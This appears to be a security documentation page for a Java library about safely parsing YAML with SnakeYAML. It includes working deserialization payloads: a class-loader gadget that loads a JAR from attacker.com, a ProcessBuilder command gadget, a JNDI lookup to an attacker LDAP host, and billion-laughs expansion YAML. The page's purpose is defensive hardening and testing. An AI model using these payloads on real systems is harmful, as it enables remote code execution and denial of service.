# SnakeYAML Security

> **CRITICAL WARNING:** SnakeYAML's default configuration allows arbitrary Java class instantiation,
> which can lead to **Remote Code Execution (RCE)**. Never use the default `Yaml()` constructor
> with untrusted input.

## Overview

SnakeYAML is a powerful YAML parser that supports YAML 1.1 features including custom tags and constructors. However, this power comes with significant security risks when processing untrusted data.

| Risk                             | Severity     | Mitigation                       |
|----------------------------------|--------------|----------------------------------|
| Arbitrary Code Execution         | **Critical** | Use `SafeConstructor`            |
| Billion Laughs (Alias Expansion) | High         | Limit `maxAliasesForCollections` |
| Stack Overflow                   | Medium       | Limit `nestingDepthLimit`        |
| Resource Exhaustion              | Medium       | Limit `codePointLimit`           |

## Arbitrary Code Execution

### The Vulnerability

SnakeYAML's default constructor can instantiate arbitrary Java classes using YAML tags:

```yaml
# This YAML can execute arbitrary code with default Yaml()
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/malicious.jar"]
  ]]
]
```

When parsed with `new Yaml().load(input)`, this:
1. Creates a `URLClassLoader` pointing to an attacker's server
2. Loads a malicious JAR file
3. Instantiates `ScriptEngineManager` with the malicious classloader
4. Executes arbitrary code on your server

### Other Dangerous Payloads

```yaml
# Execute shell command (via ProcessBuilder)
!!java.lang.ProcessBuilder [["calc.exe"]]

# JNDI injection
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://attacker.com/exploit"
  autoCommit: true
```

### The Solution: SafeConstructor

**Always** use `SafeConstructor` when parsing untrusted YAML:

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;
import org.yaml.snakeyaml.LoaderOptions;

// UNSAFE - Never do this with untrusted input:
// Yaml yaml = new Yaml();

// SAFE - Always use SafeConstructor:
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));
Object data = yaml.load(untrustedInput);
```

`SafeConstructor` only allows construction of basic Java types:
- `String`, `Integer`, `Long`, `Double`, `Boolean`
- `List`, `Map`
- `Date`, `byte[]`

Any YAML with custom tags (`!!classname`) will throw an exception.

---

## Billion Laughs Attack

### The Vulnerability

YAML aliases allow referencing previously defined anchors. Attackers can create exponentially expanding structures:

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

This small YAML file expands to **billions** of strings, consuming all available memory.

### The Solution: Limit Alias Expansion

```java
LoaderOptions options = new LoaderOptions();
options.setMaxAliasesForCollections(50);  // Default is 50, adjust as needed

Yaml yaml = new Yaml(new SafeConstructor(options));
```

With this limit, the parser throws an exception when alias expansion exceeds the threshold.

---

## Complete Secure Configuration

Use this configuration for all untrusted YAML:

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.constructor.SafeConstructor;
import de.splatgames.aether.datafixers.api.dynamic.Dynamic;
import de.splatgames.aether.datafixers.codec.yaml.snakeyaml.SnakeYamlOps;

public class SecureYamlParser {

    private static final int MAX_ALIASES = 50;
    private static final int MAX_DEPTH = 50;
    private static final int MAX_CODE_POINTS = 3 * 1024 * 1024; // 3MB

    private final Yaml yaml;

    public SecureYamlParser() {
        LoaderOptions options = new LoaderOptions();

        // Prevent Billion Laughs attack
        options.setMaxAliasesForCollections(MAX_ALIASES);

        // Prevent stack overflow from deep nesting
        options.setNestingDepthLimit(MAX_DEPTH);

        // Limit total input size
        options.setCodePointLimit(MAX_CODE_POINTS);

        // Reject duplicate keys (data integrity)
        options.setAllowDuplicateKeys(false);

        // Use SafeConstructor to prevent RCE
        this.yaml = new Yaml(new SafeConstructor(options));
    }

    public Dynamic<Object> parse(String untrustedYaml) {
        Object data = yaml.load(untrustedYaml);
        return new Dynamic<>(SnakeYamlOps.INSTANCE, data);
    }

    public Dynamic<Object> parse(InputStream untrustedInput) {
        Object data = yaml.load(untrustedInput);
        return new Dynamic<>(SnakeYamlOps.INSTANCE, data);
    }
}
```

---

## LoaderOptions Reference

| Option                     | Default | Recommended       | Purpose                   |
|----------------------------|---------|-------------------|---------------------------|
| `maxAliasesForCollections` | 50      | 50 or less        | Prevent Billion Laughs    |
| `nestingDepthLimit`        | 50      | 50 or less        | Prevent stack overflow    |
| `codePointLimit`           | 3MB     | Based on use case | Limit input size          |
| `allowDuplicateKeys`       | true    | **false**         | Data integrity            |
| `allowRecursiveKeys`       | false   | false             | Prevent recursive anchors |
| `wrappedToRootException`   | false   | true              | Better error handling     |

---

## Integration with Aether Datafixers

### Secure Migration Service

```java
public class SecureYamlMigrationService {

    private final AetherDataFixer fixer;
    private final Yaml yaml;

    public SecureYamlMigrationService(AetherDataFixer fixer) {
        this.fixer = fixer;

        LoaderOptions options = new LoaderOptions();
        options.setMaxAliasesForCollections(50);
        options.setNestingDepthLimit(50);
        options.setCodePointLimit(3 * 1024 * 1024);
        options.setAllowDuplicateKeys(false);

        this.yaml = new Yaml(new SafeConstructor(options));
    }

    public TaggedDynamic<Object> migrate(
            String untrustedYaml,
            TypeReference type,
            DataVersion from,
            DataVersion to) {

        // Parse with safe settings
        Object data = yaml.load(untrustedYaml);
        Dynamic<Object> dynamic = new Dynamic<>(SnakeYamlOps.INSTANCE, data);

        // Migrate
        TaggedDynamic<Object> tagged = new TaggedDynamic<>(type, dynamic);
        return fixer.update(tagged, from, to);
    }
}
```

### Pre-Validation

For additional security, validate input before parsing:

```java
public class YamlValidator {

    private static final long MAX_SIZE = 1024 * 1024; // 1MB

    public void validateBeforeParsing(byte[] input) {
        if (input.length > MAX_SIZE) {
            throw new SecurityException("YAML input exceeds maximum size");
        }
    }

    public void validateBeforeParsing(String input) {
        if (input.length() > MAX_SIZE) {
            throw new SecurityException("YAML input exceeds maximum size");
        }
    }
}
```

---

## Testing Your Configuration

Verify your configuration rejects malicious payloads:

```java
@Test
void rejectsArbitraryClassInstantiation() {
    String maliciousYaml = "!!java.lang.ProcessBuilder [[\"calc.exe\"]]";

    Yaml safeYaml = new Yaml(new SafeConstructor(new LoaderOptions()));

    assertThrows(YAMLException.class, () -> safeYaml.load(maliciousYaml));
}

@Test
void rejectsBillionLaughs() {
    String billionLaughs = """
        a: &a ["lol"]
        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
        """;

    LoaderOptions options = new LoaderOptions();
    options.setMaxAliasesForCollections(50);
    Yaml safeYaml = new Yaml(new SafeConstructor(options));

    assertThrows(YAMLException.class, () -> safeYaml.load(billionLaughs));
}
```

---

## Common Mistakes

### Mistake 1: Using Default Constructor

```java
// WRONG - Vulnerable to RCE
Yaml yaml = new Yaml();
Object data = yaml.load(userInput);
```

### Mistake 2: Using Custom Constructor Without SafeConstructor

```java
// WRONG - Custom constructor may still be vulnerable
class MyConstructor extends Constructor {
    // ...
}
Yaml yaml = new Yaml(new MyConstructor());
```

### Mistake 3: Forgetting LoaderOptions

```java
// WRONG - No limits on aliases or depth
Yaml yaml = new Yaml(new SafeConstructor());  // Uses default LoaderOptions
```

**Correct:**
```java
LoaderOptions options = new LoaderOptions();
options.setMaxAliasesForCollections(50);
options.setNestingDepthLimit(50);
Yaml yaml = new Yaml(new SafeConstructor(options));
```

---

## Related

- [Threat Model](../threat-model.md)
- [Best Practices](../best-practices.md)
- [YAML Support](../../codec/yaml.md)
- [Secure Configuration Examples](../secure-configuration-examples.md)
